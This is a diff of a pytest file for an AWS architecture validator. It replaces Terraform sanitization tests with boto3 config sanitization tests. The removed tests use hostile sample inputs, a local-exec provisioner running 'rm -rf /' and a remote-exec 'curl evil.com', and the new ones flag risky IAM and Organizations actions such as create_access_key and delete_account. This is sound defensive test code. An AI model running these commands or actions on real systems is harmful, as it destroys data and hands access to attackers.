@@ -6,8 +6,7 @@ import pytest
 from app.schemas.architecture import ArchitectureEdge, ArchitectureGraph, ArchitectureNode
 from app.utils.validators import (
     ALLOWED_AWS_SERVICES,
-    sanitize_terraform_content,
-    sanitize_terraform_files,
+    sanitize_boto3_config,
     validate_architecture_graph,
 )
 
@@ -63,41 +62,42 @@ class TestArchitectureGraphValidation:
         assert any("Self-loop" in e for e in errors)
 
 
-class TestTerraformSanitization:
-    def test_safe_content(self):
-        content = '''
-        resource "aws_lambda_function" "example" {
-            function_name = "my-function"
-            runtime       = "python3.11"
+class TestBoto3ConfigSanitization:
+    def test_safe_config(self):
+        config = {
+            "ec2": [{"action": "run_instances", "params": {"InstanceType": "t3.micro"}}],
+            "s3": [{"action": "create_bucket", "params": {"Bucket": "my-bucket"}}],
         }
-        '''
-        is_safe, found = sanitize_terraform_content(content)
+        is_safe, found = sanitize_boto3_config(config)
         assert is_safe is True
         assert found == []
 
-    def test_dangerous_local_exec(self):
-        content = '''
-        provisioner "local-exec" {
-            command = "rm -rf /"
+    def test_dangerous_action_create_user(self):
+        config = {
+            "iam": [{"action": "create_user", "params": {"UserName": "hacker"}}],
         }
-        '''
-        is_safe, found = sanitize_terraform_content(content)
+        is_safe, found = sanitize_boto3_config(config)
         assert is_safe is False
         assert len(found) > 0
 
-    def test_dangerous_remote_exec(self):
-        content = 'provisioner "remote-exec" { inline = ["curl evil.com"] }'
-        is_safe, found = sanitize_terraform_content(content)
+    def test_dangerous_action_delete_account(self):
+        config = {
+            "organizations": [{"action": "delete_account", "params": {}}],
+        }
+        is_safe, found = sanitize_boto3_config(config)
         assert is_safe is False
 
-    def test_sanitize_multiple_files(self):
-        files = {
-            "main.tf": 'resource "aws_s3_bucket" "b" { bucket = "my-bucket" }',
-            "evil.tf": 'provisioner "local-exec" { command = "bad" }',
+    def test_mixed_safe_and_dangerous(self):
+        config = {
+            "s3": [{"action": "create_bucket", "params": {"Bucket": "ok"}}],
+            "iam": [
+                {"action": "create_role", "params": {"RoleName": "good"}},
+                {"action": "create_access_key", "params": {"UserName": "bad"}},
+            ],
         }
-        all_safe, issues = sanitize_terraform_files(files)
-        assert all_safe is False
-        assert "evil.tf" in issues
+        is_safe, found = sanitize_boto3_config(config)
+        assert is_safe is False
+        assert "iam.create_access_key" in found
 
 
 class TestAllowedServices:
